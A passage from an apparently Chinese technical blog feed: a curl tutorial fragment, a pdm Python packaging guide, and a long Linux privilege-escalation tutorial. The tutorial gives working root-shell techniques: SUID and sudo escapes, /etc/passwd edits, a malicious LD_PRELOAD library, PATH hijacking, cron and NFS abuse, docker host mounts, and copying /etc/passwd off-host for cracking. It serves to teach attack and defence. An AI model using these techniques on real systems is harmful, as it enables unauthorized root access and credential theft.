class="string">&#x27;login=emma&#x27;</span> -d <span class="string">&#x27;password=123&#x27;</span> -X POST  https://google.com/login</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-d参数可以读取本地文本文件的数据，向服务器发送。读取data.txt文件的内容，作为数据体向服务器发送。</span></span><br><span class="line">curl -d &#x27;@data.txt&#x27; https://google.com/login</span><br></pre></td></tr></table></figure><h2 id="增加头信息"><a href="#增加头信息" class="headerlink" title="增加头信息"></a><strong>增加头信息</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 有时需要在http request之中，自行增加一个头信息。`--header`参数就可以起到这个作用。</span><br><span class="line">curl --header &quot;Content-Type:application/json&quot; http://example.com</span><br></pre></td></tr></table></figure><h2 id="HTTP认证"><a href="#HTTP认证" class="headerlink" title="HTTP认证"></a>HTTP认证</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 有些网域需要HTTP认证，这时curl需要用到`--user`参数。</span><br><span class="line">curl --user name:password example.com</span><br></pre></td></tr></table></figure><h2 id="错误和进度信息-x3D-s-S"><a href="#错误和进度信息-x3D-s-S" class="headerlink" title="错误和进度信息&#x3D;s|S"></a>错误和进度信息&#x3D;s|S</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 不输出错误和进度信息,不发生错误的话，会正常显示运行结果</span><br><span class="line">curl -s https://www.example.com</span><br><span class="line"># 如果想让 curl 不产生任何输出，可以使用下面的命令</span><br><span class="line">curl -s -o /dev/null https://google.com</span><br><span class="line"></span><br><span class="line"># 只输出错误信息，通常与-s一起使用。没有任何输出，除非发生错误</span><br><span class="line">curl -s -o /dev/null https://google.com</span><br></pre></td></tr></table></figure><h2 id="用户名和密码-x3D-u"><a href="#用户名和密码-x3D-u" class="headerlink" title="用户名和密码&#x3D;u"></a>用户名和密码&#x3D;u</h2><p>用来设置服务器认证的用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。curl 能够识别 URL 里面的用户名和密码。</span><br><span class="line">curl -u &#x27;bob:12345&#x27; https://google.com/login</span><br><span class="line"></span><br><span class="line"># 能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头</span><br><span class="line">curl https://bob:12345@google.com/login</span><br><span class="line"></span><br><span class="line"># 只设置了用户名，执行后，curl 会提示用户输入密码</span><br><span class="line">curl -u &#x27;bob&#x27; https://google.com/login</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.ruanyifeng.com/blog/2011/09/curl.html">阮一峰</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pdm</title>
      <link href="/2022/04/18/pdm/"/>
      <url>/2022/04/18/pdm/</url>
      
        <content type="html"><![CDATA[<p>#Python工具</p><blockquote><p>受到<a href="https://www.python.org/dev/peps/pep-0582/">PEP582</a>以及node管理库文件方式的启发，以「本地项目库」的形式创建及管理不同的Python环境。</p></blockquote><p>具体的介绍可以查看<a href="https://pdm.fming.dev/">官方文档</a></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>这里仅介绍官方推荐的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --user pipx</span><br><span class="line">python -m pipx ensurepath</span><br></pre></td></tr></table></figure><p>接着关闭你的终端重开一个新的，继续输入(通过[[pipx]]安装)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipx install pdm</span><br></pre></td></tr></table></figure><p>当出现以下内容时，则代表我们的pdm已经安装完成了~<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648781615280_0.png" alt="image.png"></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><blockquote><p>无法指定Python版本，只能依赖于已有的版本</p></blockquote><h3 id="项目的构建"><a href="#项目的构建" class="headerlink" title="项目的构建"></a>项目的构建</h3><p>使用pdm以当前目录作为项目仓库创建项目时，需要根据项目的实际需要^^切换到对应的Python版本^^，再执行pdm init来初始化项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\pengz\Desktop\当期博客工作台\pdm-demo</span><br><span class="line">conda activate dash-apps</span><br><span class="line">pdm init</span><br></pre></td></tr></table></figure><p>初始化项目时，根据自己的实际情况填写每个问题即可<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648782174254_0.png" alt="image.png"><br>初始化完成项目之后，可以在当前目标下创建好pyproject.toml文件，它记录了当前pdm项目的各项基本参数<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648782301234_0.png" alt="image.png"></p><h3 id="为项目安装环境"><a href="#为项目安装环境" class="headerlink" title="为项目安装环境"></a>为项目安装环境</h3><p>根据自己项目的实际需要使用pdm add命令来安装指定的单个或多个第三方Python库，以flask为例（其中第一行命令用于设置国内pypi镜像源）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pdm config pypi.url https://pypi.douban.com/simple/</span><br><span class="line">pdm add -v flask flask-login</span><br></pre></td></tr></table></figure><p>安装完成之后，可以在当前目录下看到__pypackages__目录，安装的库就隔离安装在下面，类似node的node_modules目录<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648786556788_0.png" alt="image.png"><br>与PEP582所倡导的项目结构相符合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo</span><br><span class="line">__pypackages__</span><br><span class="line">3.7</span><br><span class="line">lib</span><br><span class="line">bottle</span><br><span class="line">myscript.py</span><br></pre></td></tr></table></figure><p>这样就实现了项目级别的环境隔离效果，且无需创建额外的虚拟环境</p><h1 id="与IDE联动"><a href="#与IDE联动" class="headerlink" title="与IDE联动"></a>与IDE联动</h1><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><p>将pdm项目打开为pycharm工程之后，找到图中lib文件夹，将其标记为Sources Root即可，同时记得将解释器选为pdm init 初始化所在环境相对应的：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648786730989_0.png" alt="image.png"><br>与终端中原始环境的执行结果对比，可以发现成功实现了环境隔离，这是因为pdm项目的__pypackages__中的包会在环境本身的site-packages之前被载入，从而更好地隔离包的环境 <img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648786889318_0.png" alt="image.png"></p><h1 id="迁移"><a href="#迁移" class="headerlink" title="迁移"></a>迁移</h1><p>如果想要在其他路径或其他机器上还原莫个pdm项目，则仅需要将^^pyproject.toml 与pdm.lock^^文件拷贝过去，再在对应目录下执行^^pdm sync -v^^ 命令即可，非常的方便，类似npm install 融合package.json 功能 <img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648787012194_0.png" alt="image.png"></p><h1 id="提速"><a href="#提速" class="headerlink" title="提速"></a>提速</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdm config pypi.url https://pypi.douban.com/simple/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2022/04/17/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2022/04/17/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>知己知彼，百战不殆，有了解才有对策，不是教人有”判”头呀！！<br>Linux提权即获取root权限，可以划分为非漏洞提权和漏洞提取两部分。</p><h1 id="非漏洞提权"><a href="#非漏洞提权" class="headerlink" title="非漏洞提权"></a>非漏洞提权</h1><p>利用管理员配置不当获取权限的方法。</p><h2 id="利用SUID二进制文件进行提权"><a href="#利用SUID二进制文件进行提权" class="headerlink" title="利用SUID二进制文件进行提权"></a>利用SUID二进制文件进行提权</h2><h3 id="SUID权限"><a href="#SUID权限" class="headerlink" title="SUID权限"></a>SUID权限</h3><ol><li>SUID权限只能设置二进制文件。</li><li>命令的执行者要有二进制的执行权。</li><li>命令的执行者在执行该二进制文件的时候会获得属主身份。</li><li>SUID权限只能在程序执行过程中有效。</li></ol><p>示例：如果root给一个程序赋予了SUID权限，那么这个文件的属主就是root，在执行过程中将获得root权限。</p><h3 id="什么是SUID"><a href="#什么是SUID" class="headerlink" title="什么是SUID"></a>什么是SUID</h3><p>在实际应用中，仅设置文件的rwx基础权限无法满足安全和灵活性的需求，因此就有了SUID，SGID，SBIT的特殊权限位。具体查看 [[Linux权限]]。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>首先使用find命令去查找拥有SUID的二进制可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find -perm -u=s -type=f 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-perm 权限查找</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u=s user有s权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-<span class="built_in">type</span>=f 类型为普通的文件</span></span><br></pre></td></tr></table></figure><h4 id="假设cp有SUID权限"><a href="#假设cp有SUID权限" class="headerlink" title="假设cp有SUID权限"></a>假设cp有SUID权限</h4><p>假设如果cp有SUID权限，那么在执行cp的时候就或拥有root权限。就可以把&#x2F;etc&#x2F;passwd复制到桌面进行修改。<br>首先利用openssl生成一个密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt 1x2x3 abcd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-1 表示md5加密</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-salt 随意指定</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">abcd为密码的值</span></span><br></pre></td></tr></table></figure><p>然后按照etc&#x2F;passwd的格式添加一个新的用户，权限按root的写。useradd等的操作其实就是修改了passwd，往passwd里写就行。<br>然后再通过 cp 替换掉etc中的passwd。这样就完成了一个提权帐号的生成。</p><h4 id="假设find有SUID权限"><a href="#假设find有SUID权限" class="headerlink" title="假设find有SUID权限"></a>假设find有SUID权限</h4><p>只需要使用exec参数即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find test -exec &quot;whomi&quot; \;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-&gt; root</span></span><br></pre></td></tr></table></figure><p>find的参数用来指定其他命令，以便用来处理搜索到的结果，结果的输出需要以分号结束，在bash环境中分号代表代码块结束，有特殊意义，所以这里需要转义。<br>这个时候其实whomi也有了root权限。</p><h4 id="假设vim有SUID权限"><a href="#假设vim有SUID权限" class="headerlink" title="假设vim有SUID权限"></a>假设vim有SUID权限</h4><p>这就更简单了，使用vim直接去改就完事了。可以直接去修改passwd里的用户基本信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aaa:x:1001:1001:aaa,,,:/home/aaa/:/bin/bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改为一下形式，0表示root</span></span><br><span class="line">aaa:x:0:0:aaa,,,:/home/aaa/:/bin/bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后登入aaa，则默认是root用户</span></span><br></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>更多的内容可以参考<a href="https://gtfobins.github.io/">gtfobins</a></p><h2 id="利用sudo提权"><a href="#利用sudo提权" class="headerlink" title="利用sudo提权"></a>利用sudo提权</h2><p>可以通过sudo -l 来查看当前用户能够执行的sudo权限的命令。所以普通用户的权限一定要严格。</p><h3 id="sudo和su的区别"><a href="#sudo和su的区别" class="headerlink" title="sudo和su的区别"></a>sudo和su的区别</h3><ol><li>sudo是以root权限去运行一个命令，su是切换用户的身份</li><li>sudo只要知道自己的密码即可，su需要知道切换用户的密码</li></ol><h3 id="sudoers文件"><a href="#sudoers文件" class="headerlink" title="sudoers文件"></a>sudoers文件</h3><p>查看 ((625a5352-27a1-4c55-b58d-e848ae8ca73e))。</p><h3 id="sudo-su-amp-amp-sudo-bash"><a href="#sudo-su-amp-amp-sudo-bash" class="headerlink" title="sudo su &amp;&amp; sudo bash"></a>sudo su &amp;&amp; sudo bash</h3><p>当没有对普通用户做严格限制，就可以通过sudo su切换到root。</p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>当sudo允许执行git命令时，可以利用git来进行提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">就会提供一个！/bin/bash 的可执行窗口</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以通过</span></span><br><span class="line">sudo git -p help </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同理，输入当前用户的密码提权到root</span></span><br></pre></td></tr></table></figure><h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pty是一个伪终端库，它的spawn会调用指定的程序</span></span><br></pre></td></tr></table></figure><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在游览文件内容的时候，在底部输入！bash后回车，也能够获得一个root权限的shell</span></span><br></pre></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入！bash也能获得root shell</span></span><br></pre></td></tr></table></figure><h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><p>通过设置env环境变量来获取root权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo env /bin/bash</span><br></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ftp</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><p>通过socat客户端连接攻击机，攻击机可获得root shell。先执行服务端，后执行客户端。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650088869985_0.png" alt="image.png"></p><h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp scp /etc/passwd root@192.168.23.138:/root/Desktop</span><br></pre></td></tr></table></figure><p>然后对密码进行破解。可以使用 john 来爆破一下密码。</p><h3 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a>黑名单情况</h3><p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其他目录下执行。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650089373314_0.png" alt="image.png"><br>这种情况就是图中的 ALL, !&#x2F;usr&#x2F;bin&#x2F;find的黑名单形式。这就可以将其放到其他位置进行执行。</p><h2 id="NFS配置不当导致的Linux提权"><a href="#NFS配置不当导致的Linux提权" class="headerlink" title="NFS配置不当导致的Linux提权"></a>NFS配置不当导致的Linux提权</h2><h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><p>network file system缩写，网络文件系统，用来挂载某个目录或者文件进行共享，默认是2049端口。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>共享的文件不能给到写权限或者root权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home * (rw, no_root_squash)</span><br></pre></td></tr></table></figure><p>&#x2F;home 挂载目录，* 允许连接的主机，这里是所有，rw是读写权限，no_root_squash 代表客户端允许以root权限访问nfs。</p><blockquote><p>以上配置是错误的。</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先客户端把目标nfs的共享挂载到本地，然后把bash复制进去并赋予SUID权限，操作如图：<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650091761747_0.png" alt="image.png"><br>此时目标机的home目录下就有了一个具有SUID权限的bash。普通用户执行就可获得root权限，注意，注意需要加上 p 参数，否则权限还是当前用户的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bash -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">p参数：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">euid（有效用户），因为bash有suid权限，所以这里是root</span></span><br></pre></td></tr></table></figure><p>使用场景：和SUID很像，给程序赋予SUID权限然后利用。</p><h2 id="ps结合PATH变量进行LInux提权"><a href="#ps结合PATH变量进行LInux提权" class="headerlink" title="ps结合PATH变量进行LInux提权"></a>ps结合PATH变量进行LInux提权</h2><p>指定可执行程序所在的目录，例如bin和sbin目录，当我们在终端下运行一个命令的时候，系统会根据PATH来查找相关的可执行文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"># 并将其编译成为二进制可执行文件</span><br><span class="line"># 将这个文件拷贝到目标机并赋予执行权限和SUID</span><br></pre></td></tr></table></figure><p>通过这个文件就可以执行ps命令，之后在tmp下进行执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tmp下重新构建ps命令， 这个时候会在tmp下创建一个新的ps命令</span></span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">需要为tmp下的ps命令赋予权限，并添加到PATH中</span></span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">系统会依据PATH中的位置按顺序查找可执行文件，后添加的最新被执行</span></span><br><span class="line">cd ~/Desktop</span><br><span class="line">./shell # 上述C代码的可执行文件</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">之后就可以获得root shell</span></span><br></pre></td></tr></table></figure><h3 id="cp结合PATH提权"><a href="#cp结合PATH提权" class="headerlink" title="cp结合PATH提权"></a>cp结合PATH提权</h3><p>也可以通过cp把sh可执行程序复制过来。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650112312785_0.png" alt="image.png"></p><h3 id="符号连接结合PATH提权"><a href="#符号连接结合PATH提权" class="headerlink" title="符号连接结合PATH提权"></a>符号连接结合PATH提权</h3><p>通过 ln 命令来设置一个连接，连接到sh，但是条件是当前可执行程序所在的目录要有相关权限<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650112499689_0.png" alt="image.png"><br>但是以上操作的目录不再是tmp，而是C的二进制文件所在位置。</p><h2 id="使用LD-PRELOAD进行LInux提权"><a href="#使用LD-PRELOAD进行LInux提权" class="headerlink" title="使用LD_PRELOAD进行LInux提权"></a>使用LD_PRELOAD进行LInux提权</h2><p>是Linux下的一个环境变量，程序运行时都会加载一些so文件，类似于windows下程序加载dll，而LD_PRELOAD可以指定程序运行前加载的动态连接库。</p><blockquote><p>通过LD_PRELOAD指定恶意so文件来提权。</p></blockquote><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先按如下配置胰腺癌sudoers文件，以aaa用户为例，添加一个find命令和一个LD_PRELOAD。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650113932459_0.png" alt="image.png"><br>当通过su切换用户时，环境变量将一同改变，而想要保持某个环境不受用户切换的影响，可以在sudoers文件按中设置env_keep。</p><h4 id="提权测试"><a href="#提权测试" class="headerlink" title="提权测试"></a>提权测试</h4><p>切换会普通用户，查看sudo权限。由于定义了env_keep，虽然我们依旧只有一个find的sudo权限，且env_keep中定义了LD_PRELOAD，那么我们就可以定义一个恶意的so文件，然后sudo运行find时指定LD_PRELOAD来加载我们自己的so文件，就可以实现提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># shell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进行编译<code>-fPIC shared</code>参数简单理解就是动态编辑共享库，可以进行公共调用，nostartfiles参数代表该库运行不会去调用系统的其他库，避免影响自己的程序执行。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650114453839_0.png" alt="image.png"><br>编译后，我们使用sudo运行find并指定LD_PRELOAD为我们编译的shell.so，这时find就会先调用<code>shell.so</code>，导致我们的代码被执行，返回root shell。<br>注意：如果使用自己攻击机编译的so文件，传到目标机可能普通用户没有执行权限，这时需要加上权限。如果目标机支持gcc编译，也可以直接在目标机编译。</p><h2 id="利用Cron进行Linux提权"><a href="#利用Cron进行Linux提权" class="headerlink" title="利用Cron进行Linux提权"></a>利用Cron进行Linux提权</h2><blockquote><p>Cron是定时任务。</p></blockquote><h3 id="crontab文件覆盖"><a href="#crontab文件覆盖" class="headerlink" title="crontab文件覆盖"></a>crontab文件覆盖</h3><p>这里以root用户创建一下测试环境，利用cron定时执行一个清除特定目标的脚本，例如&#x2F;tmp&#x2F;filetest。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear.py</span></span><br><span class="line"><span class="comment"># 使用python脚本执行该功能</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">os.system(<span class="string">&#x27;rm -r /tmp/filetest/*&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure><p>然后添加定时任务，定时任务在etc&#x2F;crontab<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650115169328_0.png" alt="image.png"><br>表示每隔2分钟，就执行clear.py一次。<br>提权方式就是替换掉clear.py 中的内容。这里打算使用dash，一个比bash更小，运行速度更快shell<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650116189066_0.png" alt="image.png"><br>这里在clear脚本中，给dash增加了SUID权限。然后运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/dash -p</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这里需要一个 p 参数，让其权限向上继承，这个时候向上继承了SUID的权限，才能提权成功</span></span><br></pre></td></tr></table></figure><h2 id="利用Docker进行Linux提权"><a href="#利用Docker进行Linux提权" class="headerlink" title="利用Docker进行Linux提权"></a>利用Docker进行Linux提权</h2><blockquote><p>在docekr中是允许访问root用户和docker组中的其他用户的。</p></blockquote><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>首先以root用户身份把一个普通帐号添加到docker组，这里是test用户。然后使用<code>newgrp</code>将root帐号初始组切换为docker<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117034431_0.png" alt="image.png"><br>然后切换到test用户，可以看到当前已经在docker组<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117115663_0.png" alt="image.png"><br>之后使用<code>docker run</code>来运行<code>alpine</code>镜像，v参数进行挂载，将宿主机的root目录挂载到alpine的mnt下，使用冒号进行分割。i 参数是保持打开状态，t 参数是分配一个tty终端，it 一般结合使用，即保持通讯终端的打开。<br>这个时候访问docker镜像alpine，就相当于访问主机的root目录，权限变成了root。<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117269875_0.png" alt="image.png"><br>利用的方式还有很多，例如将宿主机的etc挂载过来，然后查看shadow文件，进行密码破解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /etc/:/mnt -it alpine</span><br></pre></td></tr></table></figure><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1650117484742_0.png" 